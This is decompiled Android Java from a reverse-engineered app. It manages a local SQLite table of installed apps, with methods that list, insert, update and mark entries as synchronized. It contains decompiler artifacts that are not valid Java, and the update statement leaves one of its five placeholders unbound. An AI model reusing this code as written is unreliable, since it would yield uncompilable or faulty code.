package com.app.system.common.h;

import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteConstraintException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import com.app.system.common.entity.AppInfo;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class c
  extends b
{
  public c(Context paramContext)
  {
    super(paramContext);
  }
  
  private String b(List<AppInfo> paramList)
  {
    if ((paramList != null) && (!paramList.isEmpty()))
    {
      if (paramList.size() == 1)
      {
        localObject = new StringBuilder();
        ((StringBuilder)localObject).append("=");
        ((StringBuilder)localObject).append(((AppInfo)paramList.get(0)).rowId);
        return ((StringBuilder)localObject).toString();
      }
      Object localObject = new StringBuilder();
      paramList = paramList.iterator();
      while (paramList.hasNext())
      {
        AppInfo localAppInfo = (AppInfo)paramList.next();
        ((StringBuilder)localObject).append(",");
        ((StringBuilder)localObject).append(localAppInfo.rowId);
      }
      localObject = ((StringBuilder)localObject).substring(1);
      paramList = new StringBuilder();
      paramList.append(" IN (");
      paramList.append((String)localObject);
      paramList.append(')');
      return paramList.toString();
    }
    return "";
  }
  
  public List<AppInfo> a(int paramInt)
  {
    ArrayList localArrayList = new ArrayList();
    try
    {
      b();
      Object localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("SELECT rowId, pkgName, appName, version, systemApp, synchronized FROM AppList WHERE synchronized = 0 ORDER BY pkgName LIMIT ");
      ((StringBuilder)localObject).append(paramInt);
      localObject = ((StringBuilder)localObject).toString();
      Cursor localCursor = this.a.rawQuery((String)localObject, null);
      while (localCursor.moveToNext())
      {
        localObject = new com/app/system/common/entity/AppInfo;
        ((AppInfo)localObject).<init>(localCursor);
        localArrayList.add(localObject);
      }
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("Selezionate ");
      ((StringBuilder)localObject).append(localArrayList.size());
      ((StringBuilder)localObject).append(" app non sincronizzate");
      a.d("TempDbAppList", ((StringBuilder)localObject).toString(), new Object[0]);
    }
    catch (SQLException localSQLException)
    {
      a.a("TempDbAppList", "getUnsynchronizedEntries:", new Object[] { localSQLException });
    }
    return localArrayList;
  }
  
  public boolean a(AppInfo paramAppInfo)
  {
    try
    {
      b();
      SQLiteStatement localSQLiteStatement = this.a.compileStatement("INSERT INTO AppList VALUES (?, ?, ?, ?, ?)");
      localSQLiteStatement.bindString(1, paramAppInfo.mPkgName);
      localSQLiteStatement.bindString(2, paramAppInfo.mAppName);
      localSQLiteStatement.bindString(3, paramAppInfo.mVersion);
      boolean bool = paramAppInfo.mSystem;
      long l1 = 1L;
      long l2;
      if (bool) {
        l2 = 1L;
      } else {
        l2 = 0L;
      }
      localSQLiteStatement.bindLong(4, l2);
      if (paramAppInfo.mSynchronized) {
        l2 = l1;
      } else {
        l2 = 0L;
      }
      localSQLiteStatement.bindLong(5, l2);
      if (localSQLiteStatement.executeInsert() == -1L)
      {
        bool = b(paramAppInfo);
        return bool;
      }
      return true;
    }
    catch (IllegalArgumentException paramAppInfo)
    {
      a.a("TempDbAppList", "addOrUpdate:", new Object[] { paramAppInfo });
      return false;
    }
    catch (SQLException paramAppInfo)
    {
      a.a("TempDbAppList", "addOrUpdate:", new Object[] { paramAppInfo });
      return false;
    }
    catch (SQLiteConstraintException localSQLiteConstraintException) {}
    return b(paramAppInfo);
  }
  
  public boolean a(List<AppInfo> paramList)
  {
    boolean bool = false;
    try
    {
      String str = b(paramList);
      if (str.isEmpty()) {
        return true;
      }
      b();
      SQLiteDatabase localSQLiteDatabase = this.a;
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("UPDATE AppList SET synchronized=1 WHERE rowId");
      localStringBuilder.append(str);
      int i = localSQLiteDatabase.compileStatement(localStringBuilder.toString()).executeUpdateDelete();
      int j = paramList.size();
      if (i == j) {
        bool = true;
      }
      return bool;
    }
    catch (SQLException paramList)
    {
      a.a("TempDbAppList", "mark as synchronized:", new Object[] { paramList });
    }
    return false;
  }
  
  public boolean b(AppInfo paramAppInfo)
  {
    boolean bool1 = false;
    try
    {
      b();
      SQLiteStatement localSQLiteStatement = this.a.compileStatement("UPDATE AppList SET appName=?, version=?, systemApp=?, synchronized=?WHERE pkgName=?");
      localSQLiteStatement.bindString(1, paramAppInfo.mAppName);
      localSQLiteStatement.bindString(2, paramAppInfo.mVersion);
      boolean bool2 = paramAppInfo.mSystem;
      long l1 = 1L;
      long l2;
      if (bool2) {
        l2 = 1L;
      } else {
        l2 = 0L;
      }
      localSQLiteStatement.bindLong(3, l2);
      if (paramAppInfo.mSynchronized) {
        l2 = l1;
      } else {
        l2 = 0L;
      }
      localSQLiteStatement.bindLong(4, l2);
      int i = localSQLiteStatement.executeUpdateDelete();
      if (i == 1) {
        bool1 = true;
      }
      return bool1;
    }
    catch (SQLException paramAppInfo)
    {
      a.a("TempDbAppList", "update:", new Object[] { paramAppInfo });
    }
    return false;
  }
}


/* Location:              ~/com/app/system/common/h/c.class
 *
 * Reversed by:           J
 */